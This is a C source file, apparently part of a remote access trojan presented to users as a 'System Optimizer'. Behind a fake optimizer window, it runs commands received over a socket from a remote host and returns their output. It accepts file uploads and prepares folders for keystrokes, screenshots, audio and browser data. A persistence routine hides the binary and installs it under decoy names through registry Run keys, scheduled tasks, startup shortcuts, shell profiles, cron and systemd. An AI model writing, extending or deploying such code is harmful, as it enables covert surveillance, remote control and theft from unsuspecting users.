http_response_t http_post_file(const char *url, const char *filepath) {
    return http_post_file_winhttp(url, filepath);
}
#else
// For non-Windows platforms, we'll use curl
#include <curl/curl.h>

CURL *curl_handle = NULL;

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    http_response_t *mem = (http_response_t *)userp;
    
    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if(ptr == NULL) {
        printf("error: not enough memory (realloc returned NULL)\n");
        return 0;
    }
    
    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;
    
    return realsize;
}

// Initialize HTTP handle
void init_http() {
    curl_global_init(CURL_GLOBAL_ALL);
    curl_handle = curl_easy_init();
    
    if (!curl_handle) {
        printf("Failed to initialize CURL\n");
        exit(1);
    }
}

// Cleanup HTTP handle
void cleanup_http() {
    if (curl_handle) {
        curl_easy_cleanup(curl_handle);
    }
    curl_global_cleanup();
}

http_response_t http_get(const char *url) {
    http_response_t response;
    response.data = malloc(1);
    response.size = 0;
    response.data[0] = '\0';
    
    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        
        CURLcode res = curl_easy_perform(curl);
        
        if(res != CURLE_OK) {
            fprintf(stderr, "http_get failed: %s\n", curl_easy_strerror(res));
        }
        
        curl_easy_cleanup(curl);
    }
    
    return response;
}

http_response_t http_post(const char *url, const char *data) {
    http_response_t response;
    response.data = malloc(1);
    response.size = 0;
    response.data[0] = '\0';
    
    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
        
        CURLcode res = curl_easy_perform(curl);
        
        if(res != CURLE_OK) {
            fprintf(stderr, "http_post failed: %s\n", curl_easy_strerror(res));
        }
        
        curl_easy_cleanup(curl);
    }
    
    return response;
}

http_response_t http_post_file(const char *url, const char *filepath) {
    http_response_t response;
    response.data = malloc(1);
    response.size = 0;
    response.data[0] = '\0';
    
    if (curl_handle) {
        curl_easy_setopt(curl_handle, CURLOPT_URL, url);
        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&response);
        curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_setopt(curl_handle, CURLOPT_TIMEOUT, 300L); // 5 minutes for large files
        curl_easy_setopt(curl_handle, CURLOPT_CONNECTTIMEOUT, 10L);
        
        // Create form data
        curl_mime *mime = curl_mime_init(curl_handle);
        curl_mimepart *part = curl_mime_addpart(mime);
        
        curl_mime_name(part, "file");
        curl_mime_filedata(part, filepath);
        
        curl_easy_setopt(curl_handle, CURLOPT_MIMEPOST, mime);
        
        CURLcode res = curl_easy_perform(curl_handle);
        
        if(res != CURLE_OK) {
            fprintf(stderr, "http_post_file failed: %s\n", curl_easy_strerror(res));
        }
        
        curl_mime_free(mime);
    }
    
    return response;
}
#endif

// Free HTTP response
void free_http_response(http_response_t *response) {
    if (response && response->data) {
        free(response->data);
        response->data = NULL;
        response->size = 0;
    }
}

// Cross-platform command execution with output capture
void execute_command(const char *cmd, char *output, int max_len) {
    FILE *fp;
    
    #ifdef _WIN32
        fp = _popen(cmd, "r");
    #else
        fp = popen(cmd, "r");
    #endif
    
    if (fp == NULL) {
        strncpy(output, "Failed to execute command", max_len);
        return;
    }

    output[0] = '\0';
    char buffer[128];
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(output, buffer, max_len - strlen(output) - 1);
    }

    #ifdef _WIN32
        _pclose(fp);
    #else
        pclose(fp);
    #endif
}

#ifdef _WIN32
// Windows GUI implementation
HWND hwndMain = NULL;
HWND hwndProgress = NULL;
HWND hwndStatus = NULL;
HWND hwndButton = NULL;
HFONT hFont = NULL;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_COMMAND:
            if (LOWORD(wParam) == 1) { // Start button
                if (!optimization_running) {
                    optimization_running = 1;
                    SetWindowText(hwndButton, "Stop Optimization");
                    SetWindowText(hwndStatus, "Optimization in progress...");
                    
                    // Start background operations in a new thread
                    _beginthreadex(NULL, 0, (_beginthreadex_proc_type)run_in_background, NULL, 0, NULL);
                    
                    // Update progress bar
                    SendMessage(hwndProgress, PBM_SETPOS, 10, 0);
                } else {
                    SetWindowText(hwndButton, "Start Optimization");
                    SetWindowText(hwndStatus, "Optimization stopped");
                    optimization_running = 0;
                }
            }
            break;
            
        case WM_CLOSE:
            if (optimization_running) {
                if (MessageBox(hwnd, "Optimization is still running. Are you sure you want to exit?", 
                             "System Optimizer", MB_YESNO | MB_ICONQUESTION) == IDNO) {
                    return 0;
                }
            }
            DestroyWindow(hwnd);
            break;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void create_gui() {
    // Initialize Common Controls
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&icex);
    
    // Register window class
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "SystemOptimizer";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClass(&wc);
    
    // Create window
    hwndMain = CreateWindow(
        "SystemOptimizer",
        "System Optimizer",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, 500, 350,
        NULL, NULL, GetModuleHandle(NULL), NULL
    );
    
    if (hwndMain == NULL) return;
    
    // Create font
    hFont = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, 
                      DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, 
                      CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
    
    // Create controls
    hwndStatus = CreateWindow(
        "STATIC",
        "Ready to optimize your system",
        WS_VISIBLE | WS_CHILD | SS_CENTER,
        50, 30, 400, 25,
        hwndMain, NULL, GetModuleHandle(NULL), NULL
    );
    
    hwndProgress = CreateWindow(
        PROGRESS_CLASS,
        NULL,
        WS_VISIBLE | WS_CHILD | PBS_SMOOTH,
        50, 80, 400, 20,
        hwndMain, NULL, GetModuleHandle(NULL), NULL
    );
    
    SendMessage(hwndProgress, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
    SendMessage(hwndProgress, PBM_SETPOS, 0, 0);
    
    hwndButton = CreateWindow(
        "BUTTON",
        "Start Optimization",
        WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON | WS_TABSTOP,
        200, 120, 100, 30,
        hwndMain, (HMENU)1, GetModuleHandle(NULL), NULL
    );
    
    // Create additional info text
    HWND hwndInfo = CreateWindow(
        "STATIC",
        "This tool will optimize your system by cleaning temporary files,\n"
        "managing startup programs, and optimizing system settings.",
        WS_VISIBLE | WS_CHILD,
        50, 170, 400, 50,
        hwndMain, NULL, GetModuleHandle(NULL), NULL
    );
    
    // Set font for controls
    if (hFont) {
        SendMessage(hwndStatus, WM_SETFONT, (WPARAM)hFont, TRUE);
        SendMessage(hwndButton, WM_SETFONT, (WPARAM)hFont, TRUE);
        SendMessage(hwndInfo, WM_SETFONT, (WPARAM)hFont, TRUE);
    }
    
    // Show window
    ShowWindow(hwndMain, SW_SHOW);
    UpdateWindow(hwndMain);
    
    gui_active = 1;
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    if (hFont) DeleteObject(hFont);
    gui_active = 0;
}
#else
// Linux GTK GUI implementation
GtkWidget *window;
GtkWidget *progress_bar;
GtkWidget *status_label;
GtkWidget *start_button;

void on_button_clicked(GtkWidget *widget, gpointer data) {
    (void)widget;
    (void)data;
    
    if (!optimization_running) {
        optimization_running = 1;
        gtk_button_set_label(GTK_BUTTON(start_button), "Stop Optimization");
        gtk_label_set_text(GTK_LABEL(status_label), "Optimization in progress...");
        gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar), 0.1);
        
        // Start background operations in a new thread
        pthread_t thread;
        pthread_create(&thread, NULL, (void *(*)(void *))run_in_background, NULL);
        pthread_detach(thread);
    } else {
        gtk_button_set_label(GTK_BUTTON(start_button), "Start Optimization");
        gtk_label_set_text(GTK_LABEL(status_label), "Optimization stopped");
        optimization_running = 0;
    }
}

void on_window_destroy(GtkWidget *widget, gpointer data) {
    (void)widget;
    (void)data;
    
    if (optimization_running) {
        GtkWidget *dialog = gtk_message_dialog_new(GTK_WINDOW(window),
                                                 GTK_DIALOG_DESTROY_WITH_PARENT,
                                                 GTK_MESSAGE_QUESTION,
                                                 GTK_BUTTONS_YES_NO,
                                                 "Optimization is still running. Are you sure you want to exit?");
        gtk_window_set_title(GTK_WINDOW(dialog), "System Optimizer");
        
        gint response = gtk_dialog_run(GTK_DIALOG(dialog));
        gtk_widget_destroy(dialog);
        
        if (response != GTK_RESPONSE_YES) {
            return;
        }
    }
    
    gtk_main_quit();
}

void create_gui() {
    gtk_init(NULL, NULL);
    
    // Create main window
    window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(window), "System Optimizer");
    gtk_window_set_default_size(GTK_WINDOW(window), 500, 350);
    gtk_container_set_border_width(GTK_CONTAINER(window), 10);
    g_signal_connect(window, "destroy", G_CALLBACK(on_window_destroy), NULL);
    
    // Create vertical box
    GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 10);
    gtk_container_add(GTK_CONTAINER(window), vbox);
    
    // Create status label
    status_label = gtk_label_new("Ready to optimize your system");
    gtk_widget_set_halign(status_label, GTK_ALIGN_CENTER);
    gtk_box_pack_start(GTK_BOX(vbox), status_label, FALSE, FALSE, 5);
    
    // Create progress bar
    progress_bar = gtk_progress_bar_new();
    gtk_box_pack_start(GTK_BOX(vbox), progress_bar, FALSE, FALSE, 5);
    
    // Create start button
    start_button = gtk_button_new_with_label("Start Optimization");
    g_signal_connect(start_button, "clicked", G_CALLBACK(on_button_clicked), NULL);
    gtk_box_pack_start(GTK_BOX(vbox), start_button, FALSE, FALSE, 10);
    
    // Create info text
    GtkWidget *info_label = gtk_label_new(
        "This tool will optimize your system by cleaning temporary files,\n"
        "managing startup programs, and optimizing system settings."
    );
    gtk_label_set_justify(GTK_LABEL(info_label), GTK_JUSTIFY_CENTER);
    gtk_box_pack_start(GTK_BOX(vbox), info_label, TRUE, TRUE, 10);
    
    // Show all widgets
    gtk_widget_show_all(window);
    
    gui_active = 1;
    
    // Start main loop
    gtk_main();
    
    gui_active = 0;
}
#endif

// Update GUI status (call from background thread)
void update_gui_status(const char *status, int progress) {
    if (!gui_active) return;
    
#ifdef _WIN32
    // Windows GUI update
    if (hwndStatus) {
        SendMessage(hwndStatus, WM_SETTEXT, 0, (LPARAM)status);
    }
    if (hwndProgress) {
        SendMessage(hwndProgress, PBM_SETPOS, progress, 0);
    }
#else
    // Linux GTK update (must be done in main thread)
    // This is a simplified version - in a real app you'd use g_idle_add
    if (status_label) {
        gtk_label_set_text(GTK_LABEL(status_label), status);
    }
    if (progress_bar) {
        gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar), progress / 100.0);
    }
#endif
}

// Create output directories
void create_output_directories() {
    const char* dirs[] = {
        "output",
        "output/screenshots",
        "output/audio",
        "output/notes",
        "output/dumps",
        "output/browser_data",
        "output/keystrokes",
        "output/captures",
        NULL
    };

    for (int i = 0; dirs[i] != NULL; i++) {
        #ifdef _WIN32
            _mkdir(dirs[i]);
        #else
            mkdir(dirs[i], 0755);
        #endif
    }
}

// Socket connection functions
int socket_connect(const char *host, int port) {
    struct sockaddr_in server_addr;
    
    // Create socket
    server_socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket_fd == INVALID_FD) {
        perror("socket");
        return 0;
    }
    
    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    // Convert host to IP address
    if (inet_pton(AF_INET, host, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(server_socket_fd);
        server_socket_fd = INVALID_FD;
        return 0;
    }
    
    // Connect to server
    if (connect(server_socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(server_socket_fd);
        server_socket_fd = INVALID_FD;
        return 0;
    }
    
    return 1;
}

int socket_send(const char *data) {
    if (server_socket_fd == INVALID_FD) {
        return -1;
    }
    
    size_t len = strlen(data);
    ssize_t sent = send(server_socket_fd, data, len, 0);
    
    if (sent < 0) {
        perror("send");
        return -1;
    }
    
    return (int)sent;
}

int socket_receive(char *buffer, int size) {
    if (server_socket_fd == INVALID_FD) {
        return -1;
    }
    
    ssize_t received = recv(server_socket_fd, buffer, size - 1, 0);
    
    if (received < 0) {
        perror("recv");
        return -1;
    }
    
    buffer[received] = '\0';
    return (int)received;
}

void socket_send_file(const char *filename, const unsigned char *buffer, size_t size) {
    if (server_socket_fd == INVALID_FD) {
        return;
    }
    
    // Send file header
    char header[512];
    snprintf(header, sizeof(header), "FILE:%s:%zu\n", filename, size);
    
    if (socket_send(header) < 0) {
        return;
    }
    
    // Send file data in chunks
    size_t sent = 0;
    while (sent < size) {
        size_t chunk = (size - sent > 4096) ? 4096 : (size - sent);
        ssize_t result = send(server_socket_fd, buffer + sent, chunk, 0);
        
        if (result < 0) {
            perror("send file data");
            return;
        }
        
        sent += (size_t)result;
    }
}

void socket_receive_file(const char *filepath) {
    if (server_socket_fd == INVALID_FD) {
        return;
    }
    
    char buffer[SOCKET_BUFFER_SIZE];
    char filename[MAX_PATH_LENGTH] = {0};
    size_t file_size = 0;
    int receiving_header = 1;
    FILE *file = NULL;
    size_t received_bytes = 0;
    
    while (1) {
        ssize_t bytes_received = recv(server_socket_fd, buffer, SOCKET_BUFFER_SIZE, 0);
        
        if (bytes_received <= 0) {
            break;
        }
        
        if (receiving_header) {
            // Look for the end of the header (newline)
            char *newline = memchr(buffer, '\n', bytes_received);
            if (newline) {
                // Extract header
                size_t header_len = newline - buffer;
                char header[512];
                if (header_len > sizeof(header) - 1) {
                    header_len = sizeof(header) - 1;
                }
                memcpy(header, buffer, header_len);
                header[header_len] = '\0';
                
                // Parse header
                if (sscanf(header, "FILE:%255[^:]:%zu", filename, &file_size) == 2) {
                    // Create directory structure if needed
                    char dir_path[MAX_PATH_LENGTH];
                    strncpy(dir_path, filepath, sizeof(dir_path));
                    char *last_slash = strrchr(dir_path, '/');
                    if (!last_slash) {
                        last_slash = strrchr(dir_path, '\\');
                    }
                    
                    if (last_slash) {
                        *last_slash = '\0'; // Terminate at directory part
                        
                        // Create directory if it doesn't exist
                        #ifdef _WIN32
                            _mkdir(dir_path);
                        #else
                            mkdir(dir_path, 0755);
                        #endif
                    }
                    
                    // Open file for writing
                    file = fopen(filepath, "wb");
                    if (!file) {
                        perror("fopen");
                        return;
                    }
                    
                    // Write remaining data from this packet
                    size_t data_start = header_len + 1; // Skip newline
                    size_t data_len = (size_t)bytes_received - data_start;
                    
                    if (data_len > 0) {
                        fwrite(buffer + data_start, 1, data_len, file);
                        received_bytes += data_len;
                    }
                    
                    receiving_header = 0;
                }
            }
        } else {
            // Write file data
            fwrite(buffer, 1, (size_t)bytes_received, file);
            received_bytes += (size_t)bytes_received;
            
            // Check if we've received the entire file
            if (received_bytes >= file_size) {
                break;
            }
        }
    }
    
    if (file) {
        fclose(file);
        printf("File received: %s (%zu bytes)\n", filepath, file_size);
    }
}

int connect_to_remote_server_socket() {
    // Get host and port from environment variables or use defaults
    char *host_env = getenv("REMOTE_HOST");
    char *port_env = getenv("REMOTE_PORT");
    
    if (host_env) {
        strncpy(socket_host, host_env, sizeof(socket_host) - 1);
    }
    
    if (port_env) {
        socket_port = atoi(port_env);
    }
    
    printf("Connecting to socket server at %s:%d...\n", socket_host, socket_port);
    
    if (socket_connect(socket_host, socket_port)) {
        // Send initial connection message
        char init_msg[MAX_PATH_LENGTH + 20];
        snprintf(init_msg, sizeof(init_msg), "CONNECTED:%s", current_dir);
        socket_send(init_msg);
        
        connected_to_server = 1;
        return 1;
    }
    
    return 0;
}

void handle_remote_commands_socket() {
    char buffer[BUFFER_SIZE];
    char file_transfer_path[MAX_PATH_LENGTH] = {0};
    int in_file_transfer = 0;
    size_t file_size_remaining = 0;
    FILE *file_transfer = NULL;
    
    while (connected_to_server) {
        memset(buffer, 0, BUFFER_SIZE);
        
        // Receive data from server
        int bytes_received = socket_receive(buffer, BUFFER_SIZE - 1);
        
        if (bytes_received <= 0) {
            // Connection lost
            connected_to_server = 0;
            break;
        }
        
        // Check if we're in the middle of a file transfer
        if (in_file_transfer) {
            // Write data to file
            size_t bytes_to_write = (size_t)bytes_received;
            if (bytes_to_write > file_size_remaining) {
                bytes_to_write = file_size_remaining;
            }
            
            fwrite(buffer, 1, bytes_to_write, file_transfer);
            file_size_remaining -= bytes_to_write;
            
            if (file_size_remaining == 0) {
                // File transfer complete
                fclose(file_transfer);
                file_transfer = NULL;
                in_file_transfer = 0;
                printf("File received: %s\n", file_transfer_path);
            }
            
            continue;
        }
        
        // Check for special commands
        if (strncmp(buffer, "send ", 5) == 0) {
            // File transfer from server to client
            char *file_path_arg = strtok(buffer + 5, " ");
            char *file_size_arg = strtok(NULL, " ");
            
            if (file_path_arg && file_size_arg) {
                strncpy(file_transfer_path, file_path_arg, sizeof(file_transfer_path) - 1);
                file_size_remaining = (size_t)atoi(file_size_arg);
                
                // Open file for writing
                file_transfer = fopen(file_transfer_path, "wb");
                if (!file_transfer) {
                    printf("Failed to create file: %s\n", file_transfer_path);
                    socket_send("ERROR: Failed to create file\n");
                } else {
                    in_file_transfer = 1;
                }
            }
            
            continue;
        }
        
        // Parse command into arguments
        char *token;
        char *args[MAX_COMMAND_LENGTH / 2 + 1];
        int arg_count = 0;
        
        // Create a copy of buffer for tokenization
        char buffer_copy[BUFFER_SIZE];
        strncpy(buffer_copy, buffer, BUFFER_SIZE - 1);
        
        token = strtok(buffer_copy, " \t\n");
        while (token != NULL && arg_count < MAX_COMMAND_LENGTH / 2) {
            args[arg_count++] = token;
            token = strtok(NULL, " \t\n");
        }
        args[arg_count] = NULL;
        
        if (arg_count == 0) {
            continue;
        }
        
        // Create output buffer for capturing command output
        g_output_buffer = create_output_buffer();
        
        // Execute command
        int found = 0;
        for (int i = 0; commands[i].name != NULL; i++) {
            if (strcmp(args[0], commands[i].name) == 0) {
                commands[i].func(args + 1);
                found = 1;
                break;
            }
        }
        
        if (!found) {
            append_to_buffer(g_output_buffer, "ERROR: Unknown command: ");
            append_to_buffer(g_output_buffer, args[0]);
            append_to_buffer(g_output_buffer, "\n");
        }
        
        // Send captured output to server
        if (g_output_buffer->size > 0) {
            socket_send(g_output_buffer->data);
        }
        
        // Clean up
        free_output_buffer(g_output_buffer);
        g_output_buffer = NULL;
        
        // Send command completion marker
        socket_send("COMMAND_COMPLETE\n");
    }
    
    // Clean up if we were in the middle of a file transfer
    if (file_transfer) {
        fclose(file_transfer);
    }
    
    // Close socket connection
    if (server_socket_fd != INVALID_FD) {
        close(server_socket_fd);
        server_socket_fd = INVALID_FD;
    }
}

// Mode-aware functions that work with both HTTP and socket
void send_data_to_server(const char *data) {
    if (use_socket_connection) {
        socket_send(data);
    } else {
        send_to_server(data);
    }
}

void receive_data_from_server(char *buffer, int size) {
    if (use_socket_connection) {
        socket_receive(buffer, size);
    } else {
        receive_from_server(buffer, size);
    }
}

void persist_command(char **args) {
    printf("\n[Persistence Installation]\n");
    
    int double_hit = 0;
    if (args[0] != NULL && strcmp(args[0], "-A") == 0) {
        double_hit = 1;
        printf("[*] Double-hit mode enabled - using multiple persistence methods\n");
    }
    
#ifdef _WIN32
    // Windows implementation
    char current_path[MAX_PATH_LENGTH];
    GetModuleFileNameA(NULL, current_path, MAX_PATH_LENGTH);
    
    // Create hidden directory
    char hidden_dir[MAX_PATH_LENGTH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, hidden_dir);
    strcat(hidden_dir, "\\Microsoft\\Windows\\GameBar");
    CreateDirectoryA(hidden_dir, NULL);
    
    // Generate unique hidden filename
    char computername[256];
    DWORD size = sizeof(computername);
    GetComputerNameA(computername, &size);
    
    char hidden_exe[MAX_PATH_LENGTH];
    snprintf(hidden_exe, sizeof(hidden_exe), "%s\\.system_service_%s.exe", hidden_dir, computername);
    
    // Copy file and set hidden attribute
    if (CopyFileA(current_path, hidden_exe, FALSE)) {
        SetFileAttributesA(hidden_exe, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        printf("[+] Copied to: %s\n", hidden_exe);
    } else {
        printf("[-] Failed to copy executable\n");
        return;
    }
    
    // Add to registry with stealth options
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                      0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        char cmd[MAX_PATH_LENGTH * 2];
        // Use cmd.exe to hide the process window completely
        snprintf(cmd, sizeof(cmd), "cmd.exe /c start /B \"\" \"%s\" --minimized", hidden_exe);
        RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)cmd, strlen(cmd) + 1);
        RegCloseKey(hKey);
        printf("[+] Added to registry startup (stealth mode)\n");
    }
    
    // Add to startup folder with hidden shortcut
    char startup_path[MAX_PATH_LENGTH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) == S_OK) {
        char shortcut_path[MAX_PATH_LENGTH];
        snprintf(shortcut_path, sizeof(shortcut_path), "%s\\SystemService.lnk", startup_path);
        
        IShellLinkA* psl;
        if (CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, 
                             &IID_IShellLinkA, (LPVOID*)&psl) == S_OK) {
            psl->lpVtbl->SetPath(psl, hidden_exe);
            psl->lpVtbl->SetArguments(psl, "--minimized");
            psl->lpVtbl->SetShowCmd(psl, SW_HIDE); // Hide window
            psl->lpVtbl->SetHotkey(psl, 0); // No hotkey
            
            IPersistFile* ppf;
            if (psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (LPVOID*)&ppf) == S_OK) {
                WCHAR wsz[MAX_PATH];
                MultiByteToWideChar(CP_ACP, 0, shortcut_path, -1, wsz, MAX_PATH);
                ppf->lpVtbl->Save(ppf, wsz, TRUE);
                ppf->lpVtbl->Release(ppf);
                
                // Set shortcut attributes to hidden
                SetFileAttributesA(shortcut_path, FILE_ATTRIBUTE_HIDDEN);
                printf("[+] Added to startup folder (hidden shortcut)\n");
            }
            psl->lpVtbl->Release(psl);
        }
    }
    
    // Schedule task with stealth options
    char task_cmd[MAX_PATH_LENGTH * 2];
    
    // Check if we have admin rights
    BOOL isAdmin = FALSE;
    HANDLE token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    
    if (isAdmin) {
        // Run with admin privileges and hidden window
        snprintf(task_cmd, sizeof(task_cmd), 
                 "schtasks /create /tn \"SystemService\" /tr \"cmd.exe /c start /B \"\" \"%s\" --minimized\" /sc onlogon /rl highest /f", 
                 hidden_exe);
        if (system(task_cmd) == 0) {
            printf("[+] Scheduled task with admin privileges (stealth mode)\n");
        } else {
            printf("[-] Failed to schedule admin task\n");
        }
    } else {
        // Try without admin privileges
        snprintf(task_cmd, sizeof(task_cmd), 
                 "schtasks /create /tn \"SystemService\" /tr \"cmd.exe /c start /B \"\" \"%s\" --minimized\" /sc onlogon /f", 
                 hidden_exe);
        if (system(task_cmd) == 0) {
            printf("[+] Scheduled task without admin privileges (stealth mode)\n");
        } else {
            printf("[-] Failed to schedule task\n");
        }
    }
    
    // Additional stealth: Add to RunOnce with a decoy name
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 
                      0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        char cmd[MAX_PATH_LENGTH * 2];
        snprintf(cmd, sizeof(cmd), "cmd.exe /c start /B \"\" \"%s\" --minimized", hidden_exe);
        RegSetValueExA(hKey, "WindowsUpdateCheck", 0, REG_SZ, (BYTE*)cmd, strlen(cmd) + 1);
        RegCloseKey(hKey);
        printf("[+] Added to RunOnce (decoy name)\n");
    }
    
#else
    // Unix implementation
    char current_path[MAX_PATH_LENGTH];
    ssize_t len = readlink("/proc/self/exe", current_path, MAX_PATH_LENGTH - 1);
    if (len != -1) {
        current_path[len] = '\0';
    } else {
        printf("[-] Failed to get executable path\n");
        return;
    }
    
    // Create hidden directory
    char *home = getenv("HOME");
    if (!home) {
        printf("[-] HOME environment variable not set\n");
        return;
    }
    
    char hidden_dir[MAX_PATH_LENGTH];
    snprintf(hidden_dir, sizeof(hidden_dir), "%s/.config/.system_service", home);
    mkdir(hidden_dir, 0700);
    
    // Generate unique hidden filename
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    
    char hidden_exe[MAX_PATH_LENGTH];
    snprintf(hidden_exe, sizeof(hidden_exe), "%s/.system_service_%s", hidden_dir, hostname);
    
    // Copy file and make executable
    char cmd[MAX_COMMAND_LENGTH * 2];
    snprintf(cmd, sizeof(cmd), "cp -f '%s' '%s' && chmod +x '%s'", 
             current_path, hidden_exe, hidden_exe);
    if (system(cmd) == 0) {
        printf("[+] Copied to: %s\n", hidden_exe);
    } else {
        printf("[-] Failed to copy executable\n");
        return;
    }
    
    // Add to shell profiles with stealth options
    const char *shell_files[] = {".bashrc", ".profile", ".zshrc", NULL};
    for (int i = 0; shell_files[i] != NULL; i++) {
        char profile_path[MAX_PATH_LENGTH];
        snprintf(profile_path, sizeof(profile_path), "%s/%s", home, shell_files[i]);
        
        FILE *fp = fopen(profile_path, "a");
        if (fp) {
            fprintf(fp, "\n# System Service persistence\n");
            // Use nohup with all output redirected to /dev/null
            fprintf(fp, "nohup '%s' --minimized >/dev/null 2>&1 &\n", hidden_exe);
            fclose(fp);
            printf("[+] Added to %s (stealth mode)\n", shell_files[i]);
        }
    }
    
    // Add cron job with stealth options
    snprintf(cmd, sizeof(cmd), 
             "(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s --minimized >/dev/null 2>&1') | crontab -", 
             hidden_exe, hidden_exe);
    if (system(cmd) == 0) {
        printf("[+] Added cron job (stealth mode)\n");
    } else {
        printf("[-] Failed to add cron job\n");
    }
    
    // Create systemd user service with stealth options
    char service_dir[MAX_PATH_LENGTH];
    snprintf(service_dir, sizeof(service_dir), "%s/.config/systemd/user", home);
    mkdir(service_dir, 0755);
    
    char service_path[MAX_PATH_LENGTH];
    snprintf(service_path, sizeof(service_path), "%s/.config/systemd/user/system-service.service", home);
    
    FILE *service_file = fopen(service_path, "w");
    if (service_file) {
        fprintf(service_file, "[Unit]\n");
        fprintf(service_file, "Description=System Service\n");
        fprintf(service_file, "After=default.target\n\n");
        fprintf(service_file, "[Service]\n");
        fprintf(service_file, "Type=simple\n");
        fprintf(service_file, "ExecStart=%s --minimized\n", hidden_exe);
        fprintf(service_file, "Restart=always\n");
        fprintf(service_file, "RestartSec=10\n");
        // Redirect all output to /dev/null
        fprintf(service_file, "StandardOutput=null\n");
        fprintf(service_file, "StandardError=null\n\n");
        fprintf(service_file, "[Install]\n");
        fprintf(service_file, "WantedBy=default.target\n");
        fclose(service_file);
        
        // Enable the service
        snprintf(cmd, sizeof(cmd), "systemctl --user enable system-service.service");
        if (system(cmd) == 0) {
            printf("[+] Created and enabled systemd user service (stealth mode)\n");
        } else {
            printf("[-] Failed to enable systemd service\n");
        }
    }
    
    // Additional stealth: Add to .xinitrc for GUI systems
    char xinitrc_path[MAX_PATH_LENGTH];
    snprintf(xinitrc_path, sizeof(xinitrc_path), "%s/.xinitrc", home);
    FILE *xinitrc = fopen(xinitrc_path, "a");
    if (xinitrc) {
        fprintf(xinitrc, "\n# System Service persistence\n");
        fprintf(xinitrc, "%s --minimized &\n", hidden_exe);
        fclose(xinitrc);
        printf("[+] Added to .xinitrc (GUI systems)\n");
    }
#endif
    
    // If double-hit mode is enabled, also call the existing persistence function
    if (double_hit) {
        printf("\n[*] Applying double-hit persistence...\n");
        install_persistence();
    }
    
    printf("[+] Persistence installation complete\n");
    printf("[+] All persistence mechanisms configured for stealth operation\n");
}

// Send buffer to server via HTTP
